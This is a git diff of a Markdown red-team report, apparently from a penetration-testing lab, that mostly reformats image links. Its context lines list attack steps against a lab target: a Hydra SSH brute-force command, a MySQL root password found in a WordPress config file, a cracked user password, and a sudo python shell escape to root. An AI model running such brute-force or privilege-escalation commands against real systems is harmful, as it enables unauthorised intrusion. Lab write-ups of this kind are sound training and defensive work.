@@ -45,35 +45,46 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - _Hydra: hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110:22 -t 4_
       - _Alternative: Guessing_
       - _Alternative: Credential Stuffing_
-![/Images/hydra_michael_BruteForce.png](michael_hydra_img1)
-![/Images/Flag2.png](michael_img2)
+
+![michael_hydra_img1](Images/hydra_michael_BruteForce.png)
+
+![michael_img2](Images/Flag2.png)
+
   - `root`: _`mySQL` Password: R@v3nSecurity_
     - **Exploit Used**
       - _Used brute force credentials to gain ssh access_
       - _Discovered Credentials in plain text in config file_
       - _mysql -u root -p wordpress_
-![/Images/wordpress_Config.png](MySQL_config_img1)
-![/Images/MySQL_Access.png](MySQL_Access_img1)
+
+![MySQL_config_img1](Images/wordpress_Config.png)
+
+![MySQL_Access_img1](Images/MySQL_Access.png)
   - `steven`: `Password:`_"pink84"_ `Hash:`_"See Image Below"_
     - **Exploit Used**
       - _mysql -u root -p wordpress_
       - _John the Ripper with RockYou Dictionary attack_
       - `sudo python -c 'import os; os.system("/bin/sh")'`_to gain root privilege_
-![/Images/root_level_access.png](root_img1)
-![/Images/Flag3_MySql.png](MySQL_Target1_img1)
+
+![root_img1](Images/root_level_access.png)
+
+![MySQL_Target1_img1](Images/Flag3_MySql.png)
 
 
 - Flags
 
 Flag 1:
-![/Images/Flag1.png](Flag_img1)
+
+![Flag_img1](Images/Flag1.png)
 
 
 Flag 2:
-![/Images/Flag2.png](flag2_img1)
+
+![flag2_img1](Images/Flag2.png)
 
 Flag 3:
-![/Images/Flag3.png](Flag_3_MySQL_img1)
+
+![Flag_3_MySQL_img1](Images/Flag3.png)
 
 Flag 4:
-![/Images/Flag4_root.png](Flag_4_root_img2)
+
+![Flag_4_root_img2](Images/Flag4_root.png)
